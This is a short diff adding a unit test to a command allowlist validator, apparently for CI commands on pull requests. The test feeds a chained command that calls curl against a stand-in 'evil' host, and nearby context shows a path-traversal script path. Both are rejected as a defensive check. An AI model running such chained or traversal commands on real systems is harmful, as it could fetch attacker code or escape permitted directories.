@@ -161,6 +161,11 @@ class AllowlistTests(unittest.TestCase):
         self.assertIsNotNone(
             mod.validate_cmd("python3 .github/scripts/../../evil.py", "pr"))
 
+    def test_logical_or_rejected(self):
+        err = mod.validate_cmd("ls || curl http://evil", "pr")
+        self.assertIsNotNone(err)
+        self.assertIn("'||'", err)
+
 
 class ExecutionTests(unittest.TestCase):
     def setUp(self):
